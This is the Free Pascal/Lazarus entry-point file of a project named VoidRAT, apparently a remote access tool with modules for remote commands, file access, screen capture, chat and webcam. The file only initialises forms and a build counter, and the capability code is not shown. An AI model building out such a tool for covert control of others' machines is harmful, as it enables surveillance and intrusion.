program VoidRAT;

{$mode delphi}{$H+}
//{$DEFINE TEMP}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Interfaces, // this includes the LCL widgetset
  Forms, VoidUnit, indylaz, ParamUnit, datetimectrls, RemoteCMDUnit,
  RemoteFileUnit, ScreenUnit, chatunit, WebcamUnit, SysUtils, Communication,
  Commands, AppendUtils, ManifestUtils, abbrevia{$IFDEF TEMP}, Dialogs{$ENDIF};

{$R *.res}

const KeepTrackFile = 'Post\build.txt';

procedure KeepTrack;
var FFile: Text;
    J: LongInt;
Begin
  if FileExists(KeepTrackFile) then Begin
    AssignFile(FFile,KeepTrackFile);
    Reset(FFile);
    Readln(FFile, J);
    CloseFile(FFile);
  end else J:=0;
  AssignFile(FFile,KeepTrackFile);
  Rewrite(FFile);
  J+=1;
  Writeln(FFile, J);
  CloseFile(FFile);
End;

begin
  RequireDerivedFormResource:=True;
  Application.Initialize;
  Application.CreateForm(TVoidForm, VoidForm);
  Application.CreateForm(TParamForm, ParamForm);
  Application.CreateForm(TRemoteCMDForm, RemoteCMDForm);
  Application.CreateForm(TFileForm, FileForm);
  Application.CreateForm(TScreenForm, ScreenForm);
  Application.CreateForm(TChatForm, ChatForm);
  Application.CreateForm(TWebcamForm, WebcamForm);
  Application.OnException:=VoidForm.ErrorHandle;
  {$IFDEF TEMP}
   ShowMessage('Temporary build 3/24/2018'+sLineBreak+'Please delete this after you''re done with the testing.');
   ShowMessage('All errors will be logged to Errors.txt. Enjoy!');
  {$ENDIF}
  //KeepTrack;
  Application.Run;
end.

